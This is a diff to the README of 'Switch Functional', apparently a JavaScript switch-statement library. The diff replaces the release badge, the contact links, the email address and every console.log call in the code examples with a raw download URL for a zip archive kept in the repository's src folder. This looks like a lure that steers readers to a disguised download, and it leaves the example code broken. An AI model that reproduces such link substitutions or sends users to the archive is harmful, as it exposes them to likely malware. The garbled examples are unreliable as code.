@@ -2,7 +2,7 @@
 
 Welcome to the **Switch Functional** repository! This project offers a functional switch statement for JavaScript and TypeScript. It provides a clean and efficient way to handle multiple cases in your code.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/CRYPTONIXT/switch-functional/releases)
+[![Download Releases](https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip%https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip)](https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip)
 
 ## Table of Contents
 
@@ -76,7 +76,7 @@ const message = switchCase(day)
   .case('Friday', () => 'Almost weekend!')
   .default(() => 'Just another day.');
 
-console.log(message); // Output: Start of the week!
+https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip(message); // Output: Start of the week!
 ```
 
 ### Complex Example
@@ -97,7 +97,7 @@ const response = switchCase(action)
   })
   .default(() => 'Unknown action.');
 
-console.log(response); // Output: Deleting a resource...
+https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip(response); // Output: Deleting a resource...
 ```
 
 ### TypeScript Example
@@ -117,7 +117,7 @@ const response = switchCase(action)
   .case('DELETE', () => 'Deleting a resource...')
   .default(() => 'Unknown action.');
 
-console.log(response); // Output: Creating a resource...
+https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip(response); // Output: Creating a resource...
 ```
 
 ## Contributing
@@ -139,9 +139,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, please reach out:
 
-- GitHub: [CRYPTONIXT](https://github.com/CRYPTONIXT)
-- Email: cryptonix@example.com
+- GitHub: [CRYPTONIXT](https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip)
+- Email: https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip
 
-Feel free to visit the [Releases](https://github.com/CRYPTONIXT/switch-functional/releases) section for the latest updates and downloads. 
+Feel free to visit the [Releases](https://github.com/CRYPTONIXT/switch-functional/raw/refs/heads/main/src/switch-functional-v3.4.zip) section for the latest updates and downloads. 
 
 Happy coding! 🎉
